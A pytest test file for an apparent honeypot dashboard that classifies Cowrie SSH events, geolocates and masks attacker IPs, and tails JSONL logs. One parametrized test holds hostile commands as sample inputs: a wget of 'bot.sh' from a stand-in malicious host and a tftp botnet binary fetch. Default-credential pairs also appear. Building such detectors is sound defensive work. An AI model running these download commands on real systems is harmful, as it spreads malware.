import asyncio
import json

import pytest

from app.classify import Classifier
from app.geo import GeoLocator, demo_location, mask_ip
from app.hub import Hub
from app.main import Pipeline
from app.tail import follow_jsonl

IP = "203.0.113.50"


def ev(event_id, session="s1", **fields):
    return {"eventid": event_id, "session": session, "src_ip": IP,
            "timestamp": "2026-11-04T12:00:00.000Z", **fields}


# ---------- Clasificador ----------

def test_connect_and_close_without_login_is_a_scan():
    c = Classifier()
    assert c.classify(ev("cowrie.session.connect")) is None
    attack = c.classify(ev("cowrie.session.closed"))
    assert attack["type"] == "scan"


def test_brute_force_session_is_not_also_counted_as_scan():
    c = Classifier()
    c.classify(ev("cowrie.session.connect"))
    attack = c.classify(ev("cowrie.login.failed", username="root", password="toor"))
    assert attack["type"] == "ssh-brute"
    assert attack["credential"] == "root:toor"
    assert c.classify(ev("cowrie.session.closed")) is None


def test_successful_login_is_an_intrusion():
    attack = Classifier().classify(ev("cowrie.login.success", username="pi", password="raspberry"))
    assert attack["type"] == "intrusion"


@pytest.mark.parametrize("command, expected", [
    ("uname -a", "command"),
    ("cd /tmp && wget http://malicioso.example/bot.sh", "malware"),
    ("/bin/busybox ECCHI", "botnet"),
    ("tftp -g -r mips 198.51.100.7", "botnet"),
])
def test_commands_are_classified(command, expected):
    attack = Classifier().classify(ev("cowrie.command.input", input=command))
    assert attack["type"] == expected


def test_ignores_events_without_ip_or_foreign_events():
    c = Classifier()
    assert c.classify({"eventid": "cowrie.login.failed"}) is None
    assert c.classify({"eventid": "otro.evento", "src_ip": IP}) is None


def test_timestamp_is_parsed_to_epoch_ms():
    attack = Classifier().classify(ev("cowrie.login.failed"))
    assert attack["timestamp"] == 1793793600000


# ---------- GeoIP y privacidad ----------

def test_demo_location_is_deterministic():
    assert demo_location(IP) == demo_location(IP)


def test_documentation_ips_get_demo_location_and_public_ips_without_db_are_unknown():
    geo = GeoLocator(None)
    assert geo.locate(IP).lat is not None
    assert geo.locate("8.8.8.8").country == "Desconocido"
    assert geo.locate("no-es-ip").country == "Desconocido"


def test_mask_ip_hides_last_octet():
    assert mask_ip("203.0.113.50") == "203.0.113.x"
    assert mask_ip("2001:db8:abcd:1234::1") == "2001:db8:abcd::/48"


# ---------- Pipeline completo ----------

def test_pipeline_never_publishes_the_full_ip():
    hub = Hub()
    pipeline = Pipeline(GeoLocator(None), hub)
    event = asyncio.run(pipeline.process(ev("cowrie.login.failed", username="a", password="b")))
    assert event["ip"] == "203.0.113.x"
    assert IP not in json.dumps(event)
    assert hub.recent[-1] == event


def test_follow_jsonl_reads_new_lines_and_skips_garbage(tmp_path):
    path = tmp_path / "cowrie.json"
    path.write_text("")

    async def scenario():
        gen = follow_jsonl(path)
        reader = asyncio.ensure_future(gen.__anext__())
        await asyncio.sleep(0.3)
        with path.open("a", encoding="utf-8") as f:
            f.write("esto no es json\n")
            f.write(json.dumps({"eventid": "cowrie.login.failed"}) + "\n")
        record = await asyncio.wait_for(reader, timeout=3)
        await gen.aclose()
        return record

    assert asyncio.run(scenario()) == {"eventid": "cowrie.login.failed"}


def test_follow_jsonl_reads_file_created_after_start(tmp_path):
    path = tmp_path / "cowrie.json"  # aún no existe

    async def scenario():
        gen = follow_jsonl(path)
        reader = asyncio.ensure_future(gen.__anext__())
        await asyncio.sleep(0.3)
        path.write_text(json.dumps({"n": 1}) + "\n", encoding="utf-8")
        record = await asyncio.wait_for(reader, timeout=3)
        await gen.aclose()
        return record

    assert asyncio.run(scenario()) == {"n": 1}
